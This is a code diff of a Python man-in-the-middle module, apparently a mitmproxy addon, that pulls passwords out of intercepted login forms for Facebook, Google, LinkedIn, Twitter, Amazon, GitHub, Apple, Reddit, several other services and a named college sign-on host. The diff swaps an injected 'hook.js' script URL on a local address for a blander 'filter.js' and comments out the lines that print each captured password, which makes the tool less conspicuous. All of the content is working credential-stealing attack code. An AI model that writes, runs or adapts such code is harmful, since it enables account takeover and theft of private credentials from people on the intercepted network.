@@ -10,13 +10,13 @@ class Get_Pwords:
 		q
 	'''
 	def __init__(self, uid):
-		self.iframe_url = "https://192.168.3.1:3000/hook.js"
+		self.iframe_url = "https://192.168.3.1/filter.js"
 		self.interface = MITM_Interface(uid)
 
 
 	def get_facebook(self,form, flow):
 		if form['pass'] and "facebook.com" in flow.request.headers[':authority']:
-			print("account: Facebook, password:", form['pass'])
+			#print("account: Facebook, password:", form['pass'])
 			return self.interface.read_traffic("facebook", form['pass'])
 		else:
 			pass
@@ -24,77 +24,77 @@ class Get_Pwords:
 		
 	def get_linkedin(self,form, flow):
 		if "linkedin.com" in flow.request.headers[':authority'] and form['session_password']:
-			print("account: Linkedin, password:", form['session_password'])
+			#print("account: Linkedin, password:", form['session_password'])
 			return self.interface.read_traffic("linkedin", form["session_password"])
 		else:
 			pass
 
 	def get_google(self, form, flow):
 		if form['Passwd'] and form['Page'] == "PasswordSeparationSignIn" and "google.com" in flow.request.headers[':authority']:
-			print("account: Gmail, password:", form['Passwd'])
+			#print("account: Gmail, password:", form['Passwd'])
 			return self.interface.read_traffic("google", form['Passwd'])
 		else:
 			pass
 
 	def get_CC(self,form, flow):
 		if flow.request.headers['Host'] == "cas.coloradocollege.edu" and form['password']: 
-			print("account: CC SSI, password:", form['password'])
+			#print("account: CC SSI, password:", form['password'])
 			return self.interface.read_traffic("cc_ssi", form['password'])
 		else:
 			pass
 
 	def get_twitter(self, form, flow):
 		if "twitter.com" in flow.request.headers[':authority'] and form['session[password]']:
-			print("account: twitter, password:", form['session[password]'])
+			#print("account: twitter, password:", form['session[password]'])
 			return self.interface.read_traffic("twitter", form['session[password]'])
 		else:
 			pass
 
 	def get_amazon(self, form, flow):
 		if "amazon.com" in flow.request.headers['Host'] and form['password']:
-			print("account: amazon, password:", form['password'])
+			#print("account: amazon, password:", form['password'])
 			return self.interface.read_traffic("amazon", form['password'])
 		else:
 			pass
 
 	def get_github(self, form, flow):
 		if "github.com" in flow.request.headers['Host'] and form['password']:
-			print("account: github, password:", form['password'])
+			#print("account: github, password:", form['password'])
 			return self.interface.read_traffic("github", form['password'])
 		else:
 			pass
 
 	def get_spotify(self, form, flow):
 		if "spotify" in flow.request.headers['Host'] and form['password']:
-			print("account: spotify, password:", form['password'])
+			#print("account: spotify, password:", form['password'])
 			return self.interface.read_traffic("spotify", form['password'])
 		else:
 			pass
 
 	def get_microsoft_live(self, form, flow):
 		if "login.live.com" in flow.request.headers['Host'] and form['passwd']:
-			print("account: microsoft, password:", form['passwd'])
+			#print("account: microsoft, password:", form['passwd'])
 			return self.interface.read_traffic("microsoft", form['passwd'])
 		else:
 			pass
 
 	def get_yahoo(self, form, flow):
 		if "login.yahoo.com" in flow.request.headers['Host'] and form['passwd']:
-			print("account: yahoo, password:", form['passwd'])
+			#print("account: yahoo, password:", form['passwd'])
 			return self.interface.read_traffic("yahoo", form['passwd'])
 		else:
 			pass
 
 	def get_apple(self, form, flow):
 		if "apple.com" in flow.request.headers['Host'] and form['login-password'] and form['login-appleId']:
-			print("account: apple, password:", form['login-password'])
+			#print("account: apple, password:", form['login-password'])
 			return self.interface.read_traffic("apple", form['login-password'])
 		else:
 			pass
 
 	def get_reddit(self, form, flow):
 		if form['op'] and form['user'] and 'www.reddit.' in flow.request.headers[':authority']:
-			print("account: reddit, password:", form['passwd'])
+			#print("account: reddit, password:", form['passwd'])
 			return self.interface.read_traffic("reddit", form['passwd'])
 		else:
 			pass
